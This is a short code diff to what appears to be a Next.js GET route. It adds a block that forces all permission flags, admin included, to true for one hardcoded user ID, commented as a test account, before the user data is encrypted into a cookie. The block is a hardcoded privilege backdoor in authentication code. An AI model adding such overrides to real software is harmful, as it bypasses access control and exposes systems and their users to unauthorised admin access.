@@ -74,6 +74,14 @@ export async function GET(request: NextRequest) {
       }
     });
 
+    // Force all permissions to true for test account
+    if (user.id === '348233630415454208') {
+      user.isCS = true;
+      user.isAdmin = true;
+      user.isKOG = true;
+      user.isKT = true;
+    }
+
     const encryptedData = await encrypt(user);
     response.cookies.set('user', JSON.stringify(encryptedData), {
       path: '/',
